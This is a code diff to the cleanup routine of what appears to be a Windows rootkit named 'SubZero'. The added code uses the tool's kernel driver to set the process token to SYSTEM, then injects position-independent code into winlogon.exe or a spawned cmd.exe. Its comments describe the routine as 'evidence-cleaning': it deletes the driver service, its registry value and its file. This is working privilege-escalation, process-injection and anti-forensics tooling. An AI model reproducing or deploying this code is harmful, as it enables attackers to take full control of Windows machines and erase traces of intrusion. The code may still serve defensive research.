@@ -9,19 +9,62 @@
 #include "../SubZeroUtils/ServiceManager.h"
 #include "../SubZeroUtils/RunningProcesses.h"
 #include "../SubZeroUtils/AutoRegistryKeyHandle.h"
+#include "../SubZeroUtils/AutoHandle.h"
+
+#include <sstream>
 
 void SubZeroCleanup::Cleanup()
 {
+    // Create a string stream that will log any exception. The final error log will only be thrown at the end of the function, in order to ensure every
+	// evidence-cleaning function will be called - even in case of an error on the way.
+    std::stringstream finalException("");
+
+    std::uint32_t picTargetPID = 0;
+	
     // Uninstall SubZero driver if exists. 
     const ServiceManager serviceManager(DRIVER_NAMEW, DRIVER_FULL_PATH, SERVICE_KERNEL_DRIVER);
     if (ERROR_SERVICE_DOES_NOT_EXIST != ::GetLastError())
-    	
+    {       
+        try
+        {
+        	// If the current process is not elevated to SYSTEM, elevate it using the driver before un-installing it.
+            if (!IsLocalSystem())
+            {
+                const AutoHandle deviceAutoHandle(::CreateFile(
+                    L"\\\\.\\" DRIVER_NAME,
+                    FILE_SHARE_READ | FILE_SHARE_WRITE,
+                    0,
+                    nullptr,
+                    OPEN_EXISTING,
+                    0,
+                    nullptr));
+                if (INVALID_HANDLE_VALUE == deviceAutoHandle.get())
+                    throw std::runtime_error("[-] Failed to open the device handle");
+
+                SubZeroSetTokenToSystemData pid = ::GetCurrentProcessId();
+
+                DWORD bytesReturned = 0;
+                if (!::DeviceIoControl(
+                    deviceAutoHandle.get(),						// device to be queried
+                    IOCTL_SUBZERO_SET_TOKEN_TO_SYSTEM,			// operation to perform
+                    &pid, sizeof(pid),					// input buffer
+                    nullptr, 0,							// output buffer
+                    &bytesReturned,                  			// # bytes returned
+                    nullptr))
+                    throw std::runtime_error("[-] DeviceIoControl Failed");
+
+            	// Current process now will bw able to inject the PIC to winlogon.exe
+                picTargetPID = GetProcessPidByProcessName(L"winlogon.exe");
+            }
+        }
+        catch (std::exception& exception)
+        {
+            finalException << exception.what() << "\n";        
+        }
+
         // Driver is loaded - this function must succeed in order to continue. Any error here should be caught by the caller and handled accordingly.
         serviceManager.stopAndRemove();
-	
-    // Create a string stream that will log any exception. The final error log will only be thrown at the end of the function, in order to ensure every
-    // evidence-cleaning function will be called - even in case of an error on the way.
-    std::stringstream finalException("");
+    }
 
     // Delete registry value
     try {
@@ -39,20 +82,16 @@ void SubZeroCleanup::Cleanup()
         if (ERROR_FILE_NOT_FOUND != lastError)
             finalException << "[-] Error deleting driver file. Error code: " << lastError << "\n";
     }
-
-    std::uint32_t targetPid;
-    try
-    {
-        targetPid = GetProcessPidByProcessName(L"explorer.exe");
-    }
-    catch (...)
+	
+	// If there was an error elevating explorer to SYSTEM
+	if (0 == picTargetPID)
     {
 		STARTUPINFO si = { 0 };
 		PROCESS_INFORMATION pi = { 0 };
     	
-		// Creates a child chrome process that will be the PIC target
+		// Creates a child cmd process that will be the PIC target
 		if (!::CreateProcessW(
-            (DIRECTORY_PATH + L"chrome.exe").c_str(),   // Module
+            L"C:\\Windows\\system32\\cmd.exe",          // Module
             nullptr,					                // Command-line
 		    nullptr,                                    // Process security attributes
 		    nullptr,                                    // Primary thread security attributes
@@ -67,14 +106,16 @@ void SubZeroCleanup::Cleanup()
             throw std::runtime_error(finalException.str());
 		}
 
-        targetPid = pi.dwProcessId;
+        picTargetPID = pi.dwProcessId;
     }
-	
+
     // Setup PIC parameters
-    PicParams picParams;
-    picParams.getProcAddress = GetProcAddress;
-    picParams.loadLibraryA = LoadLibraryA;
-    picParams.pid = ::GetCurrentProcessId();
+    PicParameters picParams =
+    {
+        LoadLibraryA,
+    	GetProcAddress,
+        ::GetCurrentProcessId()
+    };
 
     if (nullptr == picParams.getProcAddress || nullptr == picParams.loadLibraryA)
         finalException << "[-] Invalid PIC parameters\n";
@@ -84,7 +125,7 @@ void SubZeroCleanup::Cleanup()
         // Inject PIC
         try
         {
-            PicInjection::InjectPic<PicParams>(targetPid, &picParams, PicStart, PicEnd);
+            PicInjection::InjectPic<PicParameters>(picTargetPID, &picParams, PicStart, PicEnd);
         }
         catch (std::exception& exception)
         {
@@ -111,4 +152,39 @@ std::uint32_t SubZeroCleanup::GetProcessPidByProcessName(const std::wstring& pro
     }
 
     throw std::runtime_error("Could not find target process PID");
+}
+
+bool SubZeroCleanup::IsLocalSystem()
+{	
+    // open process token
+    HANDLE tokenHandle;
+    if (!OpenProcessToken(::GetCurrentProcess(),
+        TOKEN_QUERY,
+        &tokenHandle))
+        return false;
+
+    const AutoHandle tokenAutoHandle(tokenHandle);
+
+    UCHAR tokenUser[sizeof(TOKEN_USER) + 8 + 4 * SID_MAX_SUB_AUTHORITIES];
+    auto* const pTokenUser = reinterpret_cast<PTOKEN_USER>(tokenUser);
+	
+    // retrieve user SID
+    ULONG returnedLength;
+    if (!::GetTokenInformation(tokenAutoHandle.get(), TokenUser, pTokenUser,
+        sizeof(tokenUser), &returnedLength))
+        return false;
+
+    // allocate LocalSystem well-known SID
+    PSID systemSid;
+    SID_IDENTIFIER_AUTHORITY siaNT = SECURITY_NT_AUTHORITY;
+    if (!::AllocateAndInitializeSid(&siaNT, 1, SECURITY_LOCAL_SYSTEM_RID,
+        0, 0, 0, 0, 0, 0, 0, &systemSid))
+        return false;
+
+    // compare the user SID from the token with the LocalSystem SID
+    const auto isSystem = ::EqualSid(pTokenUser->User.Sid, systemSid);
+
+    ::FreeSid(systemSid);
+
+    return isSystem;
 }
